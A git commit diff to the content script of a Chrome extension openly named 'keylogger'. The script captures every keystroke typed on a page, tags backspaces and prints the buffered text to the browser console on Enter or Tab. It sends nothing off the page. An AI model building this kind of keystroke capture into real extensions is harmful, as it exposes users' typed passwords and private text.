bd58e053b30091de7c3e679b850ab947e03d2542
HrushiMakode <makodehrushikesh@gmail.com>
2020-01-31 13:29:06 +0530

    Tab change in keylogger

--- chrome_extensions/keylogger/content.js
+++ chrome_extensions/keylogger/content.js
@@ -1,11 +1,12 @@
 var title=document.title;
 console.log("Welcome to ",title);
 var str="";
+
 document.onkeypress=(e)=>{
     e = e || window.event;
     var charCode = (typeof e.which == "number") ? e.which : e.keyCode;
-    console.log("onkeypress"+charCode);
-    if(charCode==13) 
+    // console.log("onkeypress"+charCode);
+    if(charCode==10) 
         console.log(str),str="";
     else 
         str+=String.fromCharCode(charCode);
@@ -14,8 +15,8 @@ document.onkeypress=(e)=>{
 document.onkeydown=(e)=>{
     var charCode=e.keyCode;
     console.log("onkeydown"+charCode);
-    if(charCode==9) 
+    if(charCode==8)
+        str+="[BACKSPACE]";
+    if(charCode==9)
         console.log(str),str="";
-    else 
-        str+=String.fromCharCode(charCode);
 }
